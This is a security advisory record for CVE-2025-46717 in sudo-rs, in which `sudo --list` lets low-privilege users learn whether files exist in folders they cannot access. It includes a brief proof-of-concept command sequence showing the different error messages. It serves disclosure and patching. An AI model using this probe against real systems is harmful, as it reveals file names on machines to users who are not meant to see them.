advisory_id: GHSA-98cv-wqjx-wx8f
datasource_id: github_osv_importer_v2/GHSA-98cv-wqjx-wx8f
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-98cv-wqjx-wx8f/GHSA-98cv-wqjx-wx8f.json
aliases:
  - CVE-2025-46717
summary: |
  sudo-rs Allows Low Privilege Users to Discover the Existence of Files in Inaccessible Folders
  ### Summary

  Users with no (or very limited) sudo privileges can determine whether files exists in folders that they otherwise cannot access using `sudo --list <pathname>`.

  ### PoC

  As root:
  ```
  # mkdir /tmp/foo
  # chmod a-rwx /tmp/foo
  # touch /tmp/foo/secret_file
  ```
  As a user without any (or limited) sudo rights:
  ```
  $ sudo --list /tmp/foo/nonexistent_file
  sudo-rs: '/tmp/foo/nonexistent_file': command not found
  $ $ sudo --list /tmp/foo/secret_file
  sudo-rs: Sorry, user eve may not run sudo on host.
  ```
  I.e. the user can distinguish whether files exist.

  ### Related
  Original sudo (vulnerable version tested by us: 1.9.15p5) exhibited similar behaviour for files with the executable bit set.

  ### Impact
  Users with local access to a machine can discover the existence/non-existence of certain files, revealing potentially sensitive information in the file names. This information can also be used in conjunction with other attacks.

  ### Credits
  This issue was identified by sudo-rs developer Marc Schoolderman
impacted_packages: []
severities:
  - score: '3.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/05/GHSA-98cv-wqjx-wx8f/GHSA-98cv-wqjx-wx8f.json
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-497
references:
  - url: https://github.com/trifectatechfoundation/sudo-rs
    reference_type:
    reference_id:
  - url: https://github.com/trifectatechfoundation/sudo-rs/releases/tag/v0.2.6
    reference_type:
    reference_id:
  - url: https://github.com/trifectatechfoundation/sudo-rs/security/advisories/GHSA-98cv-wqjx-wx8f
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-46717
    reference_type:
    reference_id: CVE-2025-46717
